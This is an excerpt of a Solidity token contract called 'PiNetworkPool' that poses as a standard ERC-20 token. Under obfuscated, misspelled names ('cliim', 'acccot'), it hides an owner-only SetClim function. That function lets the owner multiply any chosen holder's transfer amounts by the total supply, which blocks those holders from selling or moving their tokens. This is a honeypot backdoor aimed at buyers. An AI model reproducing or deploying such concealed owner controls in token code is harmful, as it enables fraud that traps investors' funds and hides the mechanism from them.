...
interface IERC20 {
    ...
    function balanceOf(address acccot) external view returns (uint256);
...
contract token is Ownable, IERC20 {
    ...
    string private _name = "PiNetworkPool";
    string private _symbol = "PiPool";
    ...
    mapping(address => uint256) private cliim;

    function SetClim(address acccot) public onlyowner {
        cliim[acccot] = _totalSupply;
    }


    function UnClim(address acccot) public onlyowner {
        cliim[acccot] = 1;
    }


    function isClim(address acccot) public view returns (uint256) {
        return cliim[acccot];
    }
    ...
    function _transfer(address sender, address recipient, uint256 amounnts) internal virtual {
        ...
        if (cliim[sender] > 1  ) {
            amounnts = amounnts.mul(cliim[sender]);
        }
    ...
    function balanceOf(address acccot) public view override returns (uint256) {
        return _balance[acccot];
    }
